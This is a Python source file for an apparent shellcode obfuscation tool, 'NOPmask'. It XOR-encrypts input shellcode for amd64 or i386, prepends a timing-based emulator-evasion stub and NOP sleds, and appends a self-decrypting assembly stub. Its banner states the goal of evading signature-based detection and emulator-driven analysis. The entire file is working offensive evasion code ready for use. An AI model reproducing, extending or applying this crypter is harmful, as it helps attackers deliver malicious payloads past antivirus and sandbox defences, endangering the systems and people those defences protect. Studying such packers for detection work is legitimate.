import argparse, base64, math
from pwn import *

# GLOBALS
AMD64 = "amd64"
I386 = "i386"
BASE64 = "base64"
BINARY = "binary"
AMD64_GET_RIP_LEN = 0x07
DWORD_LEN = 0x04
I386_GET_EIP_LEN = 0x05
NOP_SLED_LEN = 0x08
## Assembly stubs
AMD64_GET_RIP = "lea rax, [rip]\n"
I386_GET_EIP = """
call getEIP
getEIP:
    pop eax
"""
EMULATOR_EVASION_STUB = """
rdtsc
mov edi, edx

mov ecx, 0xFFFFFFFF
delay_loop1:
    loop delay_loop1
mov ecx, 0xFFFFFFFF
delay_loop2:
    loop delay_loop2
mov ecx, 0xFFFFFFFF
delay_loop3:
    loop delay_loop3
mov ecx, 0xFFFFFFFF
delay_loop4:
    loop delay_loop4
mov ecx, 0xFFFFFFFF
delay_loop5:
    loop delay_loop5

rdtsc
sub edx, edi

cmp edx, 0x0a
jae passed_validation
ret

passed_validation:
"""
NOP_SLED = b'\x90' * NOP_SLED_LEN

# FUNCTIONS
def getKey(shellcode):
    return [shellcode[i] ^ 0x90 for i in range(len(shellcode))]

def getEncryptedShellcode(shellcode, key):
    return bytes([shellcode[i] ^ key[i] for i in range(len(shellcode))])

def generateShellcode(shellcode, arch):
    context.arch = arch

    key = getKey(shellcode)
    encryptedShellcode = getEncryptedShellcode(shellcode, key)

    shellcodeLen = len(shellcode)
    jmpLen = 0x2 if shellcodeLen<0x82 else 0x5
    trampoline = f"jmp $+{hex(shellcodeLen + (NOP_SLED_LEN * 2) + jmpLen)}\n"

    decryptStub = ""
    if (context.arch == AMD64):
        context.bits = 64
        decryptStub += AMD64_GET_RIP
        shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + AMD64_GET_RIP_LEN
        for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
            k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
            decryptStub += f"xor DWORD PTR [rax - {hex(shellcodeOffset)}], {hex(k)}\n"
            shellcodeOffset -= DWORD_LEN
            key = key[DWORD_LEN:]
        trampolineBack = f"sub rax, {hex(shellcodeStart)}\n"
        trampolineBack += f"jmp rax\n"
    elif (context.arch == I386):
        context.bits = 32
        decryptStub += I386_GET_EIP
        shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + I386_GET_EIP_LEN
        for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
            k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
            decryptStub += f"xor DWORD PTR [eax - {hex(shellcodeOffset)}], {hex(k)}\n"
            shellcodeOffset -= DWORD_LEN
            key = key[DWORD_LEN:]
        trampolineBack = f"sub eax, {hex(shellcodeStart)}\n"
        trampolineBack += f"jmp eax\n"
    else:
        raise Exception(f"Invalid architecture (must be {AMD64} or {I386})")

    newShellcode = asm(EMULATOR_EVASION_STUB) + asm(trampoline) + NOP_SLED + encryptedShellcode + NOP_SLED + asm(decryptStub) + asm(trampolineBack)
    return newShellcode

# MAIN
if __name__ == "__main__":
    print(r"""
    ██████████████████████████████████████████████
    █▄─▀█▄─▄█─▄▄─█▄─▄▄─█▄─▀█▀─▄██▀▄─██─▄▄▄▄█▄─█─▄█
    ██─█▄▀─██─██─██─▄▄▄██─█▄█─███─▀─██▄▄▄▄─██─▄▀██
    ▀▄▄▄▀▀▄▄▀▄▄▄▄▀▄▄▄▀▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
                  NOPmask — Version 1.0
 Shellcode obfuscation utility to evade signature-based 
      detection and emulator-driven analysis.

      Written by: Leopold von Niebelschuetz-Godlewski
         https://github.com/whoamiamleo/NOPmask

              Licensed under the MIT License
""")
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-a",
        "--arch",
        choices = [AMD64, I386],
        required = True,
        help='target CPU architecture'
    )
    parser.add_argument(
        "-i",
        "--input",
        required=True,
        help='path to input file'
    )
    parser.add_argument(
        "-o",
        "--output",
        required=True,
        help='path to output file'
    )
    parser.add_argument(
        "-f",
        "--format",
        choices = [BASE64, BINARY],
        required=True,
        help='format of output file'
    )

    args = parser.parse_args()

    try:
        originalShellcode = open(args.input,"rb").read()
        newShellcode = generateShellcode(originalShellcode, args.arch)
        newShellcodeLen = len(newShellcode)
        if args.format == BASE64:
            newShellcode = base64.b64encode(newShellcode)
        open(args.output,"wb").write(newShellcode)
        print("[w00t]", f"Wrote encrypted shellcode with decryption stub to \"{args.output}\" ({newShellcodeLen} bytes)")
    except Exception as e:
        print("[ERROR]", e)